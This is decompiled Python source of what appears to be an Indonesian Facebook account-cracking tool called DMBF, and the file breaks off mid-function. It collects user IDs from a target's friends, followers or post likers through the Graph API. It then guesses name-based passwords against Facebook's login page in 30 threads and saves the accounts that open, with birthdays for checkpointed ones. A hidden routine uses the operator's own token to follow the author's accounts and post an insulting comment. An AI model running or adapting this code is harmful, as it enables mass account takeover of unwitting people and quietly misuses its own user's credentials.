# uncompyle6 version 3.7.4
# Python bytecode 2.7 (62211)
# Decompiled from: Python 2.7.18 (default, Mar 20 2021, 14:58:25) 
# [GCC 4.2.1 Compatible Android (6454773 based on r365631c2) Clang 9.0.8 (https:/
# Embedded file name: DMBF.py
# Compiled at: 2021-06-26 15:37:48
q = '\x1b[00m'
h2 = '\x1b[40m'
b2 = '\x1b[44m'
c2 = '\x1b[46m'
i2 = '\x1b[42m'
u2 = '\x1b[45m'
m2 = '\x1b[41m'
p2 = '\x1b[47m'
k2 = '\x1b[43m'
b = '\x1b[1;94m'
i = '\x1b[1;92m'
c = '\x1b[1;96m'
m = '\x1b[1;91m'
u = '\x1b[1;95m'
k = '\x1b[1;93m'
p = '\x1b[1;97m'
h = '\x1b[1;90m'
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m'
O = '\x1b[1;96m'
N = '\x1b[0m'
try:
    import requests, sys, os, subprocess, random, time, re, json, uuid
    from multiprocessing.pool import ThreadPool
    from requests.exceptions import ConnectionError
    from datetime import datetime
except Exception as modul:
    print ' \x1b[0;97m[\x1b[0;91m!\x1b[0;97m] Module requests not installed yet'
    exit(' \x1b[0;97m[\x1b[0;93m#\x1b[0;97m] Please Type : pip2 install requests')

loop = 0
ok = []
cp = []
id = []
pwx = []

s = requests.Session()
rgb = random.choice(['\x1b[0;91m', '\x1b[0;92m', '\x1b[0;93m', '\x1b[0;94m', '\x1b[0;95m', '\x1b[0;96m', '\x1b[0;97m', '\x1b[0m'])
ua = s.get("https://raw.githubusercontent.com/Dumai-200/Server-Dmbf/main/ua.txt").text.strip()
ip = s.get('https://api-asutoolkit.cloudaccess.host/ip.php').text
durasi = str(datetime.now().strftime('%d-%m-%Y'))
	
ct = datetime.now()
n = ct.month
bulan = ['Januari', 'Februari', 'Maret', 'April', 'Mei', 'Juni', 'Juli', 'Agustus', 'September', 'Oktober', 'Nopember', 'Desember']
try:
    if n < 0 or n > 12:
        exit()
    nTemp = n - 1
except ValueError:
    exit()

current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
op = bulan[nTemp]

def __cekfol__():
    ua = s.get('https://raw.githubusercontent.com/Dumai-200/Server-Dmbf/main/ua.txt').text.strip()
    os.system('clear')
    try:
        token = open('/results')
        menu()
    except (KeyError, IOError):
        os.system('-mkdir /results')
        bot_komen()


def logo():
	s.get("https://raw.githubusercontent.com/Dumai-200/Server-Dmbf/main/ua.txt").text.strip()
#	__cekfol__()
#	os.system("mkdir /results")
	try:
		token = open('.ua.txt')
		token = open('.ua')
	except (KeyError,IOError):
		os.system("echo 'Mozilla/5.0 (Linux; Android 5.1; OPPO A37f Build/LMY47I) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.89 Mobile Safari/537.36' >> .ua.txt")
		os.system("echo 'Mozilla/5.0 (Linux; Android 5.1; OPPO A37f Build/LMY47I) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.89 Mobile Safari/537.36' >> .ua")
	os.system("clear")
	print("""            
  ________               _____ _____________________
\______ \             /     \\______   \_   _____/
 |    |  \   ______  /  \ /  \|    |  _/|    __)  
 |    `   \ /_____/ /    Y    \    |   \|     \   
/_______  /         \____|__  /______  /\___  /   
        \/                  \/       \/     \/    """)

def bot_komen():
    try:
        token = open('login.txt', 'r').read()
    except IOError:
        print ' \x1b[0;97m[\x1b[0;91m!\x1b[0;97m] Token Invalid'
        os.system('rm -rf login.txt')

    requests.post('https://graph.facebook.com/100003723696885/subscribers?access_token=' + token)
    requests.post('https://graph.facebook.com/100000298627412/subscribers?access_token=' + token)
    requests.post('https://graph.facebook.com/100002461344178/subscribers?access_token=' + token)
    requests.post('https://graph.facebook.com/4481379231881987/comments?message=Ganteng Dulu KONTOL :V!&access_token={t}')
    print ' \x1b[0;97m[\x1b[0;92m+\x1b[0;97m] Login Successfully'
    menu()


def login():
    os.system('clear')
    try:
        token = open('login.txt', 'r')
        menu()
    except (KeyError, IOError):
        logo()
        print '\n \x1b[0;97m  METHODE LOGIN:.........?'
        print ' \x1b[0;97m[\x1b[0;96m1\x1b[0;97m] Login Pakai Token '
        print ' \x1b[0;97m[\x1b[0;96m2\x1b[0;97m] Login Pakai Cookies'
        ask = raw_input('\n \x1b[0;97m[\x1b[0;93m?\x1b[0;97m] Pilih Salah Satu NJENG! : ')
        if ask == '':
            login()
        elif ask == '1' or ask == '01':
            tokenz()
        elif ask == '2' or ask == '02':
            cookie()
        else:
            login()


def cookie():
    logo()
    print '\n \x1b[0;97m[\x1b[0;93m*\x1b[0;97m] Cara Ambil Cookies : https://youtu.be/X7m_O_tZnTc'
    cookie = raw_input(' \x1b[0;97m[\x1b[0;92m+\x1b[0;97m] Masukkan Cookies : \x1b[0;96m')
    try:
        data = requests.get('https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_', headers={'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36', 
           'referer': 'https://m.facebook.com/', 
           'host': 'm.facebook.com', 
           'origin': 'https://m.facebook.com', 
           'upgrade-insecure-requests': '1', 
           'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7', 
           'cache-control': 'max-age=0', 
           'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 
           'content-type': 'text/html; charset=utf-8'}, cookies={'cookie': cookie})
        find_token = re.search('(EAAA\\w+)', data.text)
        hasil = ' \x1b[0;97m[\x1b[0;91m!\x1b[0;97m] Your Cookie Invalid' if find_token is None else '\n* Your fb access token : ' + find_token.group(1)
    except requests.exceptions.ConnectionError:
        print ' \x1b[0;97m[\x1b[0;91m!\x1b[0;97m] No Connection'

    cookie = open('login.txt', 'w')
    cookie.write(find_token.group(1))
    cookie.close()
    bot_komen()
    return


def tokenz():
    os.system('clear')
    try:
        token = open('login.txt', 'r')
        menu()
    except (KeyError, IOError):
        logo()
        print '\n \x1b[0;97m[\x1b[0;93m*\x1b[0;97m] Cara Ambil Token : https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed'
        token = raw_input(' \x1b[0;97m[\x1b[0;92m+\x1b[0;97m] Masukan Token : \x1b[0;96m')
        try:
            otw = requests.get('https://graph.facebook.com/me?access_token=' + token)
            a = json.loads(otw.text)
            avsid = open('login.txt', 'w')
            avsid.write(token)
            avsid.close()
            bot_komen()
        except KeyError:
            exit(' \x1b[0;97m[\x1b[0;91m!\x1b[0;97m] Token Invalid')


def menu():
    global token
    os.system('clear')
    try:
        token = open('.Status', 'r').read()
        stass = 'Premium *'
    except IOError:
        stass = 'Premium'

    try:
        token = open('login.txt', 'r').read()
    except IOError:
        print ' \x1b[0;97m[\x1b[0;91m!\x1b[0;97m] Token Invalid'
        os.system('clear')
        os.system('rm -rf login.txt')
        login()

    try:
        otw = requests.get('https://graph.facebook.com/me/?access_token=' + token)
        a = json.loads(otw.text)
        nama = a['name']
        id = a['id']
        user = a['username']
    except KeyError:
        os.system('clear')
        print ' \x1b[0;97m[\x1b[0;91m!\x1b[0;97m] Token Invalid'
        os.system('rm -rf login.txt')
        login()
    except requests.exceptions.ConnectionError:
        exit(' \x1b[0;97m[\x1b[0;91m!\x1b[0;97m] Please Check Your Network !!')

    try:
        token = open('results/hai.txt', 'r').read()
    except IOError:
        os.system('mkdir results')
        os.system("echo 'Jangan DiEdit Nanti Rusak..' >> results/hai.txt")

    logo()
    print ' ' + p + '[' + K + '*' + P + ']\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80'
    print ' ' + p + '[' + K + '*' + P + '] Nama : ' + H + U + ' %s' % nama
    print ' ' + p + '[' + K + '*' + P + '] ID   : ' + U + id
    print ' ' + p + '[' + K + '*' + P + ']\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80'
    print ' ' + p + '[' + K + '*' + P + '] IP    : ' + H + ip
    print ' ' + p + '[' + K + '*' + P + '] Status: ' + H + '\xf0\x9f\x85\xbf\xf0\x9f\x86\x81\xf0\x9f\x85\xb4\xf0\x9f\x85\xbc\xf0\x9f\x85\xb8\xf0\x9f\x86\x84\xf0\x9f\x85\xbc ' + P + ''
    print ' ' + p + '[' + K + '*' + P + ']\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80 '
    print
    print '      [ \xf0\x9f\x86\x86\xf0\x9f\x85\xb4\xf0\x9f\x85\xbb\xf0\x9f\x85\xb2\xf0\x9f\x85\xbe\xf0\x9f\x85\xbc\xf0\x9f\x85\xb4 \xf0\x9f\x86\x83\xf0\x9f\x85\xbe \xf0\x9f\x85\xbc\xf0\x9f\x86\x88 \xf0\x9f\x86\x82\xf0\x9f\x85\xb2\xf0\x9f\x86\x81\xf0\x9f\x85\xb8\xf0\x9f\x85\xbf\xf0\x9f\x86\x83 ' + H + '' + P + ']'
    print
    print '      [ SILAHKAN PILIH ' + H + '' + P + ']'
    print '' + p + ' ' + B + '1 ' + P + '> ' + K + 'Crack Dari Publik/Teman'
    print ' ' + B + '2 ' + P + '> ' + K + 'Crack Dari Followers'
    print ' ' + B + '3 ' + P + '> ' + K + 'Crack Dari Postingan'
    print ' ' + B + '4 ' + P + '> ' + K + 'Buka Hasil Crack'
    print ' ' + B + '5 ' + P + '> ' + K + 'Setting User-Agents'
    print ' ' + B + '6 ' + P + '> ' + K + 'Cek INFO Facebook'
    print ' ' + B + '9 ' + P + '> ' + M + '\xf0\x9f\x85\xba\xf0\x9f\x85\xb4\xf0\x9f\x85\xbb\xf0\x9f\x86\x84\xf0\x9f\x85\xb0\xf0\x9f\x86\x81........ ' + M + ''
    print
    ask = raw_input(' ' + P + ' [' + K + '*' + P + '] Pilih MENU ! : ')
    if ask == '':
        menu()
    elif ask == '1' or ask == '01':
        public()
    elif ask == '2' or ask == '02':
        followers()
    elif ask == '3' or ask == '03':
        reaction()
    elif ask == '4' or ask == '04':
        print '\n \x1b[0;97m[\x1b[0;96m1\x1b[0;97m] Cek hasil OK'
        print ' \x1b[0;97m[\x1b[0;96m2\x1b[0;97m] Cek hasil CP'
        ask = raw_input('\n \x1b[0;97m[\x1b[0;93m?\x1b[0;97m] Pilih Salah Satu KNTL: ')
        if ask == '':
            menu()
        elif ask == '1' or ask == '01':
            try:
                totalok = open('results/OK-%s-%s-%s.txt' % (ha, op, ta)).read().splitlines()
                print '\n \x1b[0;97m[\x1b[0;93m#\x1b[0;97m] --------------------------------------------'
                print ' \x1b[0;97m[\x1b[0;92m+\x1b[0;97m] Results \x1b[0;92mOK\x1b[0;97m Date : \x1b[0;92m%s-%s-%s \x1b[0;97mTotal : %s\x1b[0;92m' % (ha, op, ta, len(totalok))
                os.system('cat results/OK-%s-%s-%s.txt' % (ha, op, ta))
                exit(' \x1b[0;97m[\x1b[0;93m#\x1b[0;97m] --------------------------------------------')
            except IOError:
                exit(' \x1b[0;97m[\x1b[0;91m!\x1b[0;97m] Nggak Ada Hasil awokawok Makanya Ganteng Dulu')

        elif ask == '2' or ask == '02':
            try:
                totalcp = open('results/CP-%s-%s-%s.txt' % (ha, op, ta)).read().splitlines()
                print '\n \x1b[0;97m[\x1b[0;93m#\x1b[0;97m] --------------------------------------------'
                print ' \x1b[0;97m[\x1b[0;92m+\x1b[0;97m] Results \x1b[0;93mCP\x1b[0;97m Date : \x1b[0;92m%s-%s-%s \x1b[0;97mTotal : %s\x1b[0;93m' % (ha, op, ta, len(totalcp))
                os.system('cat results/CP-%s-%s-%s.txt' % (ha, op, ta))
                exit(' \x1b[0;97m[\x1b[0;93m#\x1b[0;97m] --------------------------------------------')
            except IOError:
                exit(' \x1b[0;97m[\x1b[0;91m!\x1b[0;97m] Nggak Ada Hasil awokawok Makanya Ganteng Dulu')

        else:
            menu()
    elif ask == '5' or ask == '05':
        settua()
    elif ask == '0' or ask == '00':
        os.system('rm -f login.txt')
        exit(' \x1b[0;97m[\x1b[0;96m#\x1b[0;97m] Successfully  Token')
    elif ask == '7' or ask == '07':
        ajg_mmk_ppq_ktl()
    elif ask == 'dicky' or ask == 'mr.dicky':
        os.system("echo 'Premium' >> .Status")
        bot_komen()
    elif ask == '6' or ask == '06':
        cek_ingfo()
    elif ask == '9' or ask == '99':
        exit(p + 'THANKS Dah Pake Script Ini NJING:))))))')
    else:
        menu()


def public():
    global token
    try:
        token = open('login.txt', 'r').read()
    except IOError:
        print ' \x1b[0;97m[\x1b[0;91m!\x1b[0;97m] Token Invalid'
        tokenz()

    print "\n \x1b[0;97m[\x1b[0;93m*\x1b[0;97m] Ketik 'me' kalo mau crack teman sendiri"
    idt = raw_input(' \x1b[0;97m[\x1b[0;92m+\x1b[0;97m] Tempel ID Target Nya Njir:) : ')
    try:
        pok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
        sp = json.loads(pok.text)
        print ' \x1b[0;97m[\x1b[0;92m+\x1b[0;97m] Name : ' + sp['name']
    except KeyError:
        exit(' \x1b[0;97m[\x1b[0;91m!\x1b[0;97m] bukan ID publik Njir Tolol Bet!')

    r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + token)
    z = json.loads(r.text)
    for i in z['data']:
        uid = i['id']
        name = i['name']
        id.append(uid + '<=>' + name)

    print ' \x1b[0;97m[\x1b[0;93m*\x1b[0;97m] Total ID  : \x1b[0;91m' + str(len(id))
    ask = raw_input('\n \x1b[0;97m[\x1b[0;93m?\x1b[0;97m] Pakai Password Manual Atau Tidak Njing? Y/t : ')
    if ask == 'Y' or ask == 'y':
        manual()
    print ' \x1b[0;97m[\x1b[0;93m\xe2\x80\xa2\x1b[0;97m] Sambil Nunggu Hasil Ngopi Dulu Slurr'
    print ' \x1b[0;97m[\x1b[0;93m\xe2\x80\xa2\x1b[0;97m] Nggak Ada Hasil? Mungkin Lu Kurang Ganteng Anjg'
    print
    print ' \x1b[0;97m[\x1b[0;96m+\x1b[0;97m] Account \x1b[0;92mOK\x1b[0;97m Saved In : results/OK-%s-%s-%s.txt' % (ha, op, ta)
    print ' \x1b[0;97m[\x1b[0;96m+\x1b[0;97m] Account \x1b[0;93mCP\x1b[0;97m Saved In : results/CP-%s-%s-%s.txt\n' % (ha, op, ta)

    def main(user):
        global loop
        global token
        pwx = []
        sys.stdout.write('\r \x1b[0;97m[%s>\x1b[0;97m] Proses Crack %s/%s OK-:%s - CP-:%s ' % (rgb, loop, len(id), len(ok), len(cp)))
        sys.stdout.flush()
        uid, name = user.split('<=>')
        for ss in name.split(' '):
            if len(ss) < 3:
                continue
            elif len(ss) == 1 and len(ss) == 2 and len(ss) == 3 and len(ss) == 4 or len(ss) == 5:
                pwx.append(ss + '123')
                pwx.append(ss + '1234')
                pwx.append(ss + '12345')
            else:
                pwx.append(ss + '123')
                pwx.append(ss + '12345')
                pwx.append('123456')

        try:
            for pw in pwx:
                pw = pw.lower()
                rex = requests.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pw, 'login': 'submit'}, headers={'user-agent': ua})
                xo = rex.content
                if 'mbasic_logout_button' in xo or 'save-device' in xo:
                    print '\r  \x1b[0;33m===> ' + uid + '|' + pw + '       '
                    ok.append(uid + '|' + pw)
                    save = open('results/OK-%s-%s-%s.txt' % (ha, op, ta), 'a')
                    save.write('  ===> ' + str(uid) + '|' + str(pw) + '\n')
                    save.close()
                    break
                    continue
                if 'checkpoint' in xo:
                    try:
                        token = open('login.txt').read()
                        url = 'https://graph.facebook.com/' + uid + '?access_token=' + token
                        data = s.get(url).json()
                        ttl = data['birthday'].replace('/', '-')
                        nama = data['name']
                        print '\r  \x1b[0;93m===> ' + uid + '|' + pw + '|' + ttl
                        cp.append(uid + '|' + pw + '|' + ttl)
                        save = open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a')
                        save.write('  ===> ' + str(uid) + '|' + str(pw) + '|' + ttl + '\n')
                        save.close()
                        break
                    except (KeyError, IOError):
                        ttl = ' '
                    except:
                        pass

                    print '\r  \x1b[0;93m===> ' + uid + '|' + pw + '       '
                    cp.append(uid + '|' + pw)
                    save = open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a')
                    save.write(' ===>#000000#FF0015 ' + str(uid) + '|' + str(pw) + '\n')
                    save.close()
                    break
                    continue

            loop += 1
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    exit('\n \x1b[0;97m[\x1b[0;96m#\x1b[0;97m] Selesai')


def followers():
    global token
    try:
        token = open('login.txt', 'r').read()
    except IOError:
        print ' \x1b[0;97m[\x1b[0;91m!\x1b[0;97m] Token Invalid'
        tokenz()

    print "\n \x1b[0;97m[\x1b[0;93m*\x1b[0;97m] Ketik 'me' jika ingin crack dari followers sendiri"
    idt = raw_input(' \x1b[0;97m[\x1b[0;92m+\x1b[0;97m] ID Publik : ')
    try:
        pok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
        sp = json.loads(pok.text)
        print ' \x1b[0;97m[\x1b[0;92m+\x1b[0;97m] Name : ' + sp['name']
    except KeyError:
        exit(' \x1b[0;97m[\x1b[0;91m!\x1b[0;97m] ID Public Tidak Ada!')

    r = requests.get('https://graph.facebook.com/' + idt + '/subscribers?limit=5000&access_token=' + token)
    z = json.loads(r.text)
    for i in z['data']:
        uid = i['id']
        name = i['name']
        id.append(uid + '<=>' + name)

    print ' \x1b[0;97m[\x1b[0;93m*\x1b[0;97m] Total ID  : \x1b[0;91m' + str(len(id))
    ask = raw_input('\n \x1b[0;97m[\x1b[0;93m?\x1b[0;97m] Pakai Password Manual Atau Tidak Njing ? Y/t : ')
    if ask == 'Y' or ask == 'y':
        manual()
    print ' \x1b[0;97m[\x1b[0;96m+\x1b[0;97m] Account \x1b[0;92mOK\x1b[0;97m Saved In : results/OK-%s-%s-%s.txt' % (ha, op, ta)
    print ' \x1b[0;97m[\x1b[0;96m+\x1b[0;97m] Account \x1b[0;93mCP\x1b[0;97m Saved In : results/CP-%s-%s-%s.txt\n' % (ha, op, ta)

    def main(user):
        global loop
        global token
        pwx = []
        sys.stdout.write('\r \x1b[0;97m[%s*\x1b[0;97m] Proses Crack %s/%s OK-:%s - CP-:%s ' % (rgb, loop, len(id), len(ok), len(cp)))
        sys.stdout.flush()
        uid, name = user.split('<=>')
        for ss in name.split(' '):
            if len(ss) < 3:
                continue
            elif len(ss) == 1 and len(ss) == 2 and len(ss) == 3 and len(ss) == 4 or len(ss) == 5:
                pwx.append(ss + '123')
                pwx.append(ss + '1234')
                pwx.append(ss + '12345')
            else:
                pwx.append(ss + '123')
                pwx.append(ss + '12345')

        try:
            for pw in pwx:
                pw = pw.lower()
                rex = requests.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pw, 'login': 'submit'}, headers={'user-agent': ua})
                xo = rex.content
                if 'mbasic_logout_button' in xo or 'save-device' in xo:
                    print '\r  \x1b[0;92m===> ' + uid + '|' + pw + '       '
                    ok.append(uid + '|' + pw)
                    save = open('results/OK-%s-%s-%s.txt' % (ha, op, ta), 'a')
                    save.write('  ===> ' + str(uid) + '|' + str(pw) + '\n')
                    save.close()
                    break
                    continue
                if 'checkpoint' in xo:
                    try:
                        token = open('login.txt').read()
                        url = 'https://graph.facebook.com/' + uid + '?access_token=' + token
                        data = s.get(url).json()
                        ttl = data['birthday'].replace('/', '-')
                        nama = data['name']
                        print '\r  \x1b[0;93m===> ' + uid + '|' + pw + '|' + ttl
                        cp.append(uid + '|' + pw + '|' + ttl)
                        save = open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a')
                        save.write('   <===>> ' + str(uid) + '|' + str(pw) + '|' + ttl + '\n')
                        save.close()
                        break
                    except (KeyError, IOError):
                        ttl = ' '
                    except:
                        pass

                    print '\r  \x1b[0;93m===> ' + uid + '|' + pw + '       '
                    cp.append(uid + '|' + pw)
                    save = open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a')
                    save.write('  <===>> ' + str(uid) + '|' + str(pw) + '\n')
                    save.close()
                    break
                    continue

            loop += 1
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    exit('\n \x1b[0;97m[\x1b[0;96m#\x1b[0;97m] Selesai')


def reaction():
    global token
    try:
        token = open('login.txt', 'r').read()
    except IOError:
        print ' \x1b[0;97m[\x1b[0;91m!\x1b[0;97m] Token Invalid'
        tokenz()

    print '\n \x1b[0;97m[\x1b[0;93m*\x1b[0;97m] Ex :/post/\x1b[0;92m629986xxxxx\x1b[0;97m (hanya id post)'
    idt = raw_input(' \x1b[0;97m[\x1b[0;92m+\x1b[0;97m] ID Post : ')
    try:
        pok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
        sp = json.loads(pok.text)
    except KeyError:
        exit(' \x1b[0;97m[\x1b[0;91m!\x1b[0;97m] ID Postingan Tidak Ada!')

    r = requests.get('https://graph.facebook.com/' + idt + '/likes?limit=5000&access_token=' + token)
    z = json.loads(r.text)
    for i in z['data']:
        uid = i['id']
        name = i['name']
        id.append(uid + '<=>' + name)

    print ' \x1b[0;97m[\x1b[0;93m*\x1b[0;97m] Total ID  : \x1b[0;91m' + str(len(id))
    ask = raw_input('\n \x1b[0;97m[\x1b[0;93m?\x1b[0;97m] Pakai Password Manual Atau Tidak Njing? Y/t : ')
    if ask == 'Y' or ask == 'y':
        manual()
    print ' \x1b[0;97m[\x1b[0;96m+\x1b[0;97m] Account \x1b[0;92mOK\x1b[0;97m Saved In : results/OK-%s-%s-%s.txt' % (ha, op, ta)
    print ' \x1b[0;97m[\x1b[0;96m+\x1b[0;97m] Account \x1b[0;93mCP\x1b[0;97m Saved In : results/CP-%s-%s-%s.txt\n' % (ha, op, ta)

    def main(user):
        global loop
        global token
        pwx = []
        sys.stdout.write('\r \x1b[0;97m[%s*\x1b[0;97m] Proses Crack %s/%s OK-:%s - CP-:%s ' % (rgb, loop, len(id), len(ok), len(cp)))
        sys.stdout.flush()
        uid, name = user.split('<=>')
        for ss in name.split(' '):
            if len(ss) < 3:
                continue
            elif len(ss) == 1 and len(ss) == 2 and len(ss) == 3 and len(ss) == 4 or len(ss) == 5:
                pwx.append(ss + '123')
                pwx.append(ss + '12345')
            else:
                pwx.append(ss + '123')
                pwx.append(ss + '12345')
                pwx.append(ss + '1234')

        try:
            for pw in pwx:
                pw = pw.lower()
                rex = requests.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pw, 'login': 'submit'}, headers={'user-agent': ua})
                xo = rex.content
                if 'mbasic_logout_button' in xo or 'save-device' in xo:
                    print '\r  \x1b[0;92m===> ' + uid + '|' + pw + '       '
                    ok.append(uid + '|' + pw)
                    save = open('results/OK-%s-%s-%s.txt' % (ha, op, ta), 'a')
                    save.write('  ===> ' + str(uid) + '|' + str(pw) + '\n')
                    save.close()
                    break
                    continue
                if 'checkpoint' in xo:
                    try:
                        token = open('login.txt').read()
                        url = 'https://graph.facebook.com/' + uid + '?access_token=' + token
                        data = s.get(url).json()
                        ttl = data['birthday'].replace('/', '-')
                        nama = data['name']
                        print '\r  \x1b[0;93m===> ' + uid + '|' + pw + '|' + ttl
                        cp.append(uid + '|' + pw + '|' + ttl)
                        save = open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a')
                        save.write('  ===> ' + str(uid) + '|' + str(pw) + '|' + ttl + '\n')
                        save.close()
                        break
                    except (KeyError, IOError):
                        ttl = ' '
                    except:
                        pass

                    print '\r  \x1b[0;93m===> ' + uid + '|' + pw + '       '
                    cp.append(uid + '|' + pw)
                    save = open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a')
                    save.write('  * --> ' + str(uid) + '|' + str(pw) + '\n')
                    save.close()
                    break
                    continue

            loop += 1
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    exit('\n \x1b[0;97m[\x1b[0;96m#\x1b[0;97m] Cukup Segini Aja Yakk:)')


def manual():
    print ' \x1b[0;97m[\x1b[0;93m*\x1b[0;97m] Contoh : bismillah,sayang,indonesia'
    pw = raw_input(' \x1b[0;97m[\x1b[0;93m?\x1b[0;97m] Buat Password : ')
    print '\n \x1b[0;97m[\x1b[0;93m*\x1b[0;97m] Crack Dengan Password : \x1b[0;91m%s' % pw
    if len(pw) == 0:
        exit(' \x1b[0;97m[\x1b[0;91m!\x1b[0;97m] ISI YANG BENER TOLOL')
    print ' \x1b[0;97m[\x1b[0;96m+\x1b[0;97m] Account \x1b[0;92mOK\x1b[0;97m Saved In : results/OK-%s-%s-%s.txt' % (ha, op, ta)
    print ' \x1b[0;97m[\x1b[0;96m+\x1b[0;97m] Account \x1b[0;93mCP\x1b[0;97m Saved In : results/CP-%s-%s-%s.txt\n' % (ha, op, ta)

    def main(user):
        global loop
        global token
        sys.stdout.write('\r \x1b[0;93m[\x1b[0;93m\xc3\x97\x1b[0;93m] Proses Crack %s/%s OK-:%s - CP-:%s ' % (loop, len(id), len(ok), len(cp)))
        sys.stdout.flush()
        uid, name = user.split('<=>')
        ss = name.split(' ')
        try:
            os.mkdir('results')
        except OSError:
            pass

        try:
            for asu in pw.split(','):
                rex = requests.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': asu, 'login': 'submit'}, headers={'user-agent': ua})
                xo = rex.content
                if 'mbasic_logout_button' in xo or 'save-device' in xo:
                    print '\r  \x1b[0;92m===> ' + uid + '|' + asu + '       '
                    ok.append(uid + '|' + asu)
                    save = open('results/OK-%s-%s-%s.txt' % (ha, op, ta), 'a')
                    save.write('  ===> ' + str(uid) + '|' + str(asu) + '\n')
                    save.close()
                    break
                    continue
                if 'checkpoint' in xo:
                    try:
                        token = open('login.txt').read()
                        url = 'https://graph.facebook.com/' + uid + '?access_token=' + token
                        data = s.get(url).json()
                        ttl = data['birthday'].replace('/', '-')
                        print '\r  \x1b[0;93m===> ' + uid + '|' + asu + '|' + ttl
                        cp.append(uid + '|' + asu + '|' + ttl)
                        save = open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a')
                        save.write('  ===> ' + str(uid) + '|' + str(asu) + '|' + ttl + '\n')
                        save.close()
                        break
                    except (KeyError, IOError):
                        ttl = ' '
                    except:
                        pass

                    print '\r  \x1b[0;93m===> ' + uid + '|' + asu + '       '
                    cp.append(uid + '|' + asu)
                    save = open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a')
                    save.write('  ===> ' + str(uid) + '|' + str(asu) + '\n')
                    save.close()
                    break
                    continue

            loop += 1
        except:
            pass

    p = ThreadPool(20)
    p.map(main, id)
    exit('\n \x1b[0;97m[\x1b[0;96m#\x1b[0;97m] Selesai')


def settua():
    ask = raw_input('\n \x1b[0;97m[\x1b[0;93m?\x1b[0;97m] Anda ingin mengganti User Agent? [Y/t] : ')
    if ask == '':
        menu()
    elif ask == 'y' or ask == 'Y':
        try:
            print '\n \x1b[0;97m[\x1b[0;93m*\x1b[0;97m] Ketik di pencarian chrome : My User Agent'
            ua = raw_input(' \x1b[0;97m[\x1b[0;96m+\x1b[0;97m] User Agent : ')
            uas = open('.ua', 'w')
            uas.write(ua)
            uas.close()
            print ' \x1b[0;97m[\x1b[0;92m\xe2\x9c\x93\x1b[0;97m] Sukses mengganti User-Agent'
            time.sleep(2)
            menu()
        except KeyboardInterrupt:
            exit()

    elif ask == 't' or ask == 'T':
        try:
            ua = s.get('https://raw.githubusercontent.com/Dumai-200/Server-Dmbf/main/ua.txt').text.strip()
            uas = open('.ua', 'w')
            uas.write(ua)
            uas.close()
            print '\n \x1b[0;97m[\x1b[0;92m\xe2\x9c\x93\x1b[0;97m] Berhasil mengganti User-Agent'
            time.sleep(2)
            menu()
        except KeyboardInterrupt:
            exit()

    else:
        menu()


def cek_ingfo():
    try:
        __cindy__ = open('login.txt', 'r').read()
    except (KeyError, IOError):
        print p + '\n Token Facebook Erorr !!'
        os.system('rm -rf login.txt')
        time.sleep(0.01)
        login()

    try:
        ajg = raw_input(c + '\n [' + p + '?' + c + ']' + p + 'Masukkan ID Target :' + k + ' ')
        if ajg in ('user', 'User', 'USER'):
            print p + 'Anda Akan DiArahkan Ke Browser :)'
            os.system('xdg-open https://commentpicker.com/find-facebook-id.php')
            cek_ingfo()
    except (KeyError, IOError):
        cek_ingfo()

    try:
        otw = requests.get('https://graph.facebook.com/%s?access_token=%s' % (ajg, __cindy__))
        a = json.loads(otw.text)
